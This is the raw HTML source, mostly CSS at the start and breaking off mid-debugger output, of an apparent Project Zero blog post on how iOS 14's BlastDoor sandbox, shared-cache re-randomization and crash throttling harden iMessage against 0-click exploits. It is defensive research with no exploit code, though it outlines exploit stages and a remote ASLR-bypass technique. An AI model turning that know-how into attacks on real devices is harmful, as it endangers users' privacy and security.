"}ul.lst-kix_xkot2rd1rwjd-0{list-style-type:none}.lst-kix_a7picbopwap5-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_xkot2rd1rwjd-2{list-style-type:none}ul.lst-kix_xkot2rd1rwjd-1{list-style-type:none}ul.lst-kix_xkot2rd1rwjd-4{list-style-type:none}ul.lst-kix_xkot2rd1rwjd-3{list-style-type:none}ul.lst-kix_xkot2rd1rwjd-6{list-style-type:none}ul.lst-kix_xkot2rd1rwjd-5{list-style-type:none}ul.lst-kix_xkot2rd1rwjd-8{list-style-type:none}ul.lst-kix_xkot2rd1rwjd-7{list-style-type:none}.lst-kix_xkot2rd1rwjd-4&gt;li:before{content:"\0025cb  "}.lst-kix_f1zwtsa21lze-2&gt;li{counter-increment:lst-ctn-kix_f1zwtsa21lze-2}.lst-kix_aue93cd1tacp-3&gt;li{counter-increment:lst-ctn-kix_aue93cd1tacp-3}.lst-kix_33m87cusbobo-3&gt;li:before{content:"\0025cf  "}.lst-kix_5fvsno8h94t-1&gt;li:before{content:"\0025cb  "}.lst-kix_5fvsno8h94t-5&gt;li:before{content:"\0025a0  "}.lst-kix_ju6nxsiwjdzc-4&gt;li:before{content:"\0025cb  "}.lst-kix_hmo7gyj5poo-5&gt;li:before{content:"" counter(lst-ctn-kix_hmo7gyj5poo-5,lower-roman) ". "}.lst-kix_a7picbopwap5-2&gt;li:before{content:"\0025a0  "}.lst-kix_2zj51yim977x-6&gt;li{counter-increment:lst-ctn-kix_2zj51yim977x-6}.lst-kix_33m87cusbobo-7&gt;li:before{content:"\0025cb  "}.lst-kix_xkot2rd1rwjd-0&gt;li:before{content:"\0025cf  "}ol.lst-kix_hmo7gyj5poo-6.start{counter-reset:lst-ctn-kix_hmo7gyj5poo-6 0}.lst-kix_ju6nxsiwjdzc-8&gt;li:before{content:"\0025a0  "}.lst-kix_ha0mdd7f5mn8-8&gt;li:before{content:"" counter(lst-ctn-kix_ha0mdd7f5mn8-8,lower-roman) ". "}.lst-kix_ct3zb543qdjl-4&gt;li{counter-increment:lst-ctn-kix_ct3zb543qdjl-4}.lst-kix_ha0mdd7f5mn8-4&gt;li:before{content:"(" counter(lst-ctn-kix_ha0mdd7f5mn8-4,lower-latin) ") "}.lst-kix_aue93cd1tacp-5&gt;li{counter-increment:lst-ctn-kix_aue93cd1tacp-5}.lst-kix_xkot2rd1rwjd-8&gt;li:before{content:"\0025a0  "}.lst-kix_yvc47pi19nhn-5&gt;li:before{content:"\0025a0  "}.lst-kix_n1wl50guyz1t-0&gt;li:before{content:"\0025cf  "}.lst-kix_yvc47pi19nhn-1&gt;li:before{content:"\0025cb  "}.lst-kix_mqtiiergx266-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_n1wl50guyz1t-1{list-style-type:none}ul.lst-kix_n1wl50guyz1t-0{list-style-type:none}ul.lst-kix_n1wl50guyz1t-3{list-style-type:none}ul.lst-kix_n1wl50guyz1t-2{list-style-type:none}.lst-kix_ezf2mrk385uq-3&gt;li{counter-increment:lst-ctn-kix_ezf2mrk385uq-3}.lst-kix_u10h5r66zlog-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_n1wl50guyz1t-8{list-style-type:none}ul.lst-kix_n1wl50guyz1t-5{list-style-type:none}ul.lst-kix_n1wl50guyz1t-4{list-style-type:none}ol.lst-kix_hmo7gyj5poo-7.start{counter-reset:lst-ctn-kix_hmo7gyj5poo-7 0}ul.lst-kix_n1wl50guyz1t-7{list-style-type:none}.lst-kix_gavezx7jyt0h-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_n1wl50guyz1t-6{list-style-type:none}ul.lst-kix_5fvsno8h94t-4{list-style-type:none}ul.lst-kix_5fvsno8h94t-3{list-style-type:none}ul.lst-kix_5fvsno8h94t-6{list-style-type:none}ul.lst-kix_5fvsno8h94t-5{list-style-type:none}ul.lst-kix_5fvsno8h94t-0{list-style-type:none}.lst-kix_ct3zb543qdjl-5&gt;li:before{content:"" counter(lst-ctn-kix_ct3zb543qdjl-5,lower-roman) ". "}ul.lst-kix_5fvsno8h94t-2{list-style-type:none}.lst-kix_hmo7gyj5poo-1&gt;li:before{content:"" counter(lst-ctn-kix_hmo7gyj5poo-1,lower-latin) ". "}ul.lst-kix_5fvsno8h94t-1{list-style-type:none}.lst-kix_hisa166i97g-1&gt;li{counter-increment:lst-ctn-kix_hisa166i97g-1}.lst-kix_n1wl50guyz1t-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_5fvsno8h94t-8{list-style-type:none}ul.lst-kix_5fvsno8h94t-7{list-style-type:none}.lst-kix_hmo7gyj5poo-4&gt;li{counter-increment:lst-ctn-kix_hmo7gyj5poo-4}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_gavezx7jyt0h-1&gt;li:before{content:"\0025cb  "}.lst-kix_n1wl50guyz1t-4&gt;li:before{content:"\0025cb  "}.lst-kix_f1zwtsa21lze-7&gt;li:before{content:"" counter(lst-ctn-kix_f1zwtsa21lze-7,lower-latin) ". "}.lst-kix_ct3zb543qdjl-1&gt;li:before{content:"" counter(lst-ctn-kix_ct3zb543qdjl-1,lower-latin) ". "}.lst-kix_u10h5r66zlog-1&gt;li:before{content:"\0025cb  "}ol.lst-kix_hmo7gyj5poo-8.start{counter-reset:lst-ctn-kix_hmo7gyj5poo-8 0}.lst-kix_mqtiiergx266-7&gt;li:before{content:"\0025cb  "}.lst-kix_ha0mdd7f5mn8-3&gt;li{counter-increment:lst-ctn-kix_ha0mdd7f5mn8-3}ol{margin:0;padding:0}table td,table th{padding:0}.c9{background-color:#ffffff;padding-top:0pt;padding-bottom:0pt;line-height:1.38;orphans:2;widows:2;text-align:left}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:Consolas,"Courier New";font-style:normal}.c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:8pt;font-family:Consolas,"Courier New";font-style:normal}.c5{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:20pt;font-family:"Arial";font-style:normal}.c13{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c14{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.c17{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c26{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c21{color:#000000;text-decoration:none;vertical-align:baseline;font-size:12pt;font-style:normal}.c8{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c7{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c19{text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c29{color:#000000;font-weight:700;font-family:Consolas,"Courier New"}.c27{text-decoration:none;vertical-align:baseline;font-style:normal}.c28{border:1px solid black;margin:5px}.c10{background-color:#efefef;font-size:10pt}.c30{max-width:468pt;padding:72pt 72pt 72pt 72pt}.c16{color:inherit;text-decoration:inherit}.c22{font-size:12pt;color:#999999}.c11{margin-left:36pt;padding-left:0pt}.c15{padding:0;margin:0}.c6{font-weight:400;font-family:Consolas,"Courier New"}.c31{color:#000000}.c4{height:11pt}.c23{background-color:#efefef}.c12{color:#666666}.c18{background-color:#ffffff}.c20{font-size:10pt}.c24{font-size:12pt}.c25{font-style:italic}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c18 c30"&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;Posted By Samuel Gro&amp;szlig;, Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;On December 20, Citizenlab published &amp;ldquo;&lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://citizenlab.ca/2020/12/the-great-ipwn-journalists-hacked-with-suspected-nso-group-imessage-zero-click-exploit/"&gt;The Great iPwn&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;rdquo;, detailing how &lt;/span&gt;&lt;span&gt;&amp;ldquo;Journalists [were] Hacked with Suspected NSO Group iMessage &amp;lsquo;Zero-Click&amp;rsquo; Exploit&amp;rdquo;&lt;/span&gt;&lt;span&gt;. Of particular interest is the following note: &amp;ldquo;We do not believe that [the exploit] works against iOS 14 and above, which includes new security protections&amp;#39;&amp;#39;. Given that it is also now almost exactly one year ago since we published the &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-1.html"&gt;Remote iPhone Exploitation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;blog post series&lt;/span&gt;&lt;span class="c2"&gt;, in which we described how an iMessage 0-click exploit can work in practice and gave a number of suggestions on how similar attacks could be prevented in the future, now seemed like a great time to dig into the security improvements in iOS 14 in more detail and explore how Apple has hardened their platform against 0-click attacks.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The content of this blog post is the result of a roughly one-week reverse engineering project, mostly performed on a M1 Mac Mini running macOS 11.1, with the results, where possible, verified to also apply to iOS 14.3, running on an iPhone XS. Due to the nature of this project and the limited timeframe, it is possible that I have missed some relevant changes or made mistakes interpreting some results. Where possible, I&amp;rsquo;ve tried to describe the steps necessary to verify the presented results, and would appreciate any corrections or additions.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The blog post will start with an overview of the major changes Apple implemented in iOS 14 which affect the security of iMessage. Afterwards, and mostly for the readers interested in the technical details, each of the major improvements is described in more detail while also providing a walkthrough of how it was reverse engineered. At least for the technical details, it is recommended to briefly review the blog post series from last year for a basic introduction to iMessage and the exploitation techniques used to attack it.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c13" id="h.2ep7vgcii9xa"&gt;&lt;span class="c5"&gt;Overview&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;Memory corruption based 0-click exploits typically require at least the following pieces:&lt;/span&gt;&lt;/p&gt;&lt;ol class="c15 lst-kix_2zj51yim977x-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;A memory corruption vulnerability, reachable without user interaction and ideally without triggering any user notifications&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span&gt;A way to break &lt;/span&gt;&lt;span class="c2"&gt;ASLR remotely&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;A way to turn the vulnerability into remote code execution&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span&gt;(&lt;/span&gt;&lt;span&gt;Likely&lt;/span&gt;&lt;span class="c2"&gt;) A way to break out of any sandbox, typically by exploiting a separate vulnerability in another operating system component (e.g. a userspace service or the kernel)&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;With iOS 14, Apple shipped a significant refactoring of iMessage processing, and made all four parts of the attack harder. This is mainly due to three central changes:&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c17" id="h.xlynwox5rkc7"&gt;&lt;span class="c14"&gt;1. The BlastDoor Service&lt;/span&gt;&lt;/h2&gt; &lt;p class="c1"&gt;&lt;span&gt;One of the major changes in iOS 14 is the introduction of a new, tightly sandboxed &amp;ldquo;BlastDoor&amp;rdquo; service which is now responsible for almost all parsing of untrusted data in iMessages (for example, &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1858"&gt;NSKeyedArchiver payloads&lt;/a&gt;&lt;/span&gt;&lt;span&gt;). Furthermore, this service is written in &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://developer.apple.com/swift/"&gt;Swift&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;a (mostly) memory safe language which makes it significantly harder to introduce classic memory corruption vulnerabilities into the code base.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The following diagram shows the rough new iMessage processing pipeline, with the name of the respective service process shown at the top of each box.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c25 c26"&gt;&lt;a href="https://1.bp.blogspot.com/-x-zo-b-w89w/YBCYLpT52pI/AAAAAAAAasA/wy9SBgIYdfImsv3Y6VAO4qmQczmHFEI9gCNcBGAsYHQ/s623/image1.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-x-zo-b-w89w/YBCYLpT52pI/AAAAAAAAasA/wy9SBgIYdfImsv3Y6VAO4qmQczmHFEI9gCNcBGAsYHQ/s600/image1.png" border="0" alt="The iMessage processing pipeline in iOS 14 and macOS Big Sur. An iMessage arrives in apsd as a push notification from Apple&amp;rsquo;s servers. From there, it is first passed to identityservicesd, which decrypts its payload using the local iMessage private key, then to imagent. Imagent then delegates the majority of the parsing work to the BlastDoor service. Afterwards, if the iMessage contains any attachments, they are downloaded from iCloud servers by IMTransferAgent. If the iMessage contains plugin data (such as a URL with a preview image), the serialized plugin data is again processed by the BlastDoor service and a preview message is generated from it. Finally, IMDPersistenceAgent stores the iMessage into the messages database, triggers a user notification, and returns to imagent, which sends the delivery receipt to the iMessage servers and thus to the sender." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;As can be seen, the majority of the processing of complex, untrusted data has been moved into the new BlastDoor service. Furthermore, this design with its 7+ involved services allows fine-grained sandboxing rules to be applied, for example, only the &lt;/span&gt;&lt;span class="c6"&gt;IMTransferAgent&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c6"&gt;apsd&lt;/span&gt;&lt;span&gt;&amp;nbsp;processes are required to perform network operations. As such, all services in this pipeline are now properly sandboxed (with the BlastDoor service arguably being sandboxed the strongest).&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c17" id="h.i6ctyzs304y5"&gt;&lt;span class="c14"&gt;2. Re-randomization of the Dyld Shared Cache Region&lt;/span&gt;&lt;/h2&gt; &lt;p class="c1"&gt;&lt;span&gt;Historically, ASLR on Apple&amp;rsquo;s platforms had one architectural weakness: the &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://iphonedevwiki.net/index.php/Dyld_shared_cache"&gt;shared cache region&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, containing most of the system libraries in a single prelinked blob, was only randomized per boot, and so would stay at the same address across all processes. This turned out to be especially critical in the context of 0-click attacks, as &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-2.html"&gt;it allowed an attacker, able to remotely observe process crashes (e.g. through timing of automatic delivery receipts), to infer the base address of the shared cache&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;and as such break ASLR, a prerequisite for subsequent exploitation steps. &lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;However, with iOS 14, Apple has added logic to &lt;/span&gt;&lt;span class="c25"&gt;specifically&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;detect this kind of attack, in which case the shared cache is re-randomized for the targeted service the next time it is started, thus rendering this technique useless. This should make bypassing ASLR in a 0-click attack context significantly harder or even impossible (apart from brute force) depending on the concrete vulnerability.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c17" id="h.jbwmwscsj1ir"&gt;&lt;span class="c14"&gt;3. Exponential Throttling to Slow Down Brute Force Attacks&lt;/span&gt;&lt;/h2&gt; &lt;p class="c1"&gt;&lt;span&gt;To limit an attacker&amp;rsquo;s ability to retry exploits or brute force ASLR, the BlastDoor and imagent services are now subject to a newly introduced &lt;/span&gt;&lt;span&gt;exponential throttling mechanism enforced by &lt;/span&gt;&lt;span class="c6"&gt;launchd&lt;/span&gt;&lt;span class="c2"&gt;, causing the interval between restarts after a crash to double with every subsequent crash (up to an apparent maximum of 20 minutes). With this change, an exploit that relied on repeatedly crashing the attacked service would now likely require in the order of multiple hours to roughly half a day to complete instead of a few minutes.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The remainder of this blog post will now look at each of these three changes in greater depths.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c13" id="h.wft5qr5guboi"&gt;&lt;span class="c5"&gt;The BlastDoor Service&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span&gt;The new BlastDoor service and its role in the processing of iMessages can be studied by following the flow of an incoming iMessage. On the wire, a simple text iMessage would look something like this, encoded as binary &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://en.wikipedia.org/wiki/Property_list"&gt;plist&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c21 c6"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c6 c24"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c22 c6 c27"&gt;// Group UUID&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c21 c6"&gt;&amp;nbsp; &amp;nbsp; gid = &amp;quot;008412B9-A4F7-4B96-96C3-70C4276CB2BE&amp;quot;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c6 c24"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c27 c22 c6"&gt;// Group protocol version&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c21 c6"&gt;&amp;nbsp; &amp;nbsp; gv = 8;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c6 c24"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c27 c22 c6"&gt;// Chat participants&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c21 c6"&gt;&amp;nbsp; &amp;nbsp; p = &amp;nbsp; &amp;nbsp; (&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c21 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;mailto:sender@foo.bar&amp;quot;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c21 c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;mailto:receiver@foo.bar&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c21 c6"&gt;&amp;nbsp; &amp;nbsp; );&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c6 c24"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c27 c22 c6"&gt;// Participants version&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c21 c6"&gt;&amp;nbsp; &amp;nbsp; pv = 0;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c6 c24"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c22 c6"&gt;// Message being replied to, usually the last message in the chat&lt;/span&gt;&lt;span class="c21 c6"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c21 c6"&gt;&amp;nbsp; &amp;nbsp; r = &amp;quot;6401430E-CDD3-4BC7-A377-7611706B431F&amp;quot;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c6 c24"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c27 c22 c6"&gt;// The plain text content&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c21 c6"&gt;&amp;nbsp; &amp;nbsp; t = &amp;quot;Hello World!&amp;quot;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c6 c24"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c27 c22 c6"&gt;// Probably some other version number&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c6 c21"&gt;&amp;nbsp; &amp;nbsp; v = 1;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c6 c24"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6 c22"&gt;// The rich text content &lt;/span&gt;&lt;span class="c21 c6"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c21 c6"&gt;&amp;nbsp; &amp;nbsp; x = &amp;quot;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;Hello World!&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;; &amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c9"&gt;&lt;span class="c6 c24"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;As such, the minimal steps required to parse it are:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class="c15 lst-kix_hisa166i97g-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;If necessary, decompress the binary data&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;Decode the plist from its binary serialization format&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;Extract its various fields and ensure they have the correct type&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span&gt;Decode the `&lt;/span&gt;&lt;span class="c6"&gt;x&lt;/span&gt;&lt;span class="c2"&gt;` key if present, using an XML decoder&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Previously, all of this work happened in imagent. With iOS 14, however, it all moved into the new BlastDoor service. While the main processing flow still starts in &lt;/span&gt;&lt;span class="c6"&gt;imagent&lt;/span&gt;&lt;span&gt;, which receives the raw but unencrypted payload bytes from &lt;/span&gt;&lt;span class="c6"&gt;identityservicesd&lt;/span&gt;&lt;span&gt;&amp;nbsp;(part of the IDS framework) in &lt;/span&gt;&lt;span class="c10 c6"&gt;-[IMDiMessageIDSDelegate service:account:incomingTopLevelMessage:fromID:messageContext:]&lt;/span&gt;&lt;span&gt;, messages &lt;/span&gt;&lt;span&gt;are then more or less immediately forwarded to the BlastDoor service through &lt;/span&gt;&lt;span class="c10 c6"&gt;+[IMBlastdoor sendDictionary:withCompletionBlock:]&lt;/span&gt;&lt;span class="c20"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;which creates the reply handler block and then calls &lt;/span&gt;&lt;span class="c10 c6"&gt;-[IMMessagesBlastDoorInterface diffuseTopLevelDictionary:resultHandler:]&lt;/span&gt;&lt;span class="c2"&gt;. At that point processing ends up in Swift code that deserializes the binary payload and sends it to the BlastDoor service over XPC.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;Inside BlastDoor, the work mostly happens in BlastDoor.framework and MessagesBlastDoorService. As most of it is written in Swift, it is fairly unpleasant to statically reverse engineer it (no symbols, many virtual calls, swift runtime code sprinkled all over the place), but fortunately, that is also not really necessary for the purpose of this blog post. However, it is worth noting that while the high level control flow logic is written in Swift, some of the parsing steps still involve the existing ObjectiveC or C implementations. For example, XML is being parsed by libxml, and the NSKeyedArchiver payloads by the ObjectiveC implementation of NSKeyedUnarchiver.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;The responses from BlastDoor can be seen by breaking on the reply handler function in imagent (the function can be found in &lt;/span&gt;&lt;span class="c6 c23"&gt;+[IMBlastdoor sendDictionary:withCompletionBlock:]&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span&gt;by searching for XREFs to the string &amp;ldquo;&lt;/span&gt;&lt;span class="c6"&gt;Blastdoor response %p received (command: %hhu, guid: %@)&lt;/span&gt;&lt;span class="c2"&gt;&amp;rdquo; in IMDaemonCore.framework). A typical BlastDoor response for a simple text message is shown below:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;(lldb) po $x2&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;TextMessage(&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; metadata: BlastDoor.Metadata(&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; messageGUID: D391CC96-9CC6-44C6-B827-1DEB0F252529,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; timestamp: Optional(1610108299117662350),&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; wantsDeliveryReceipt: true,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; wantsCheckpointing: false,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; storageContext: BlastDoor.Metadata.StorageContext(&lt;/span&gt;&lt;/p&gt; &lt;p 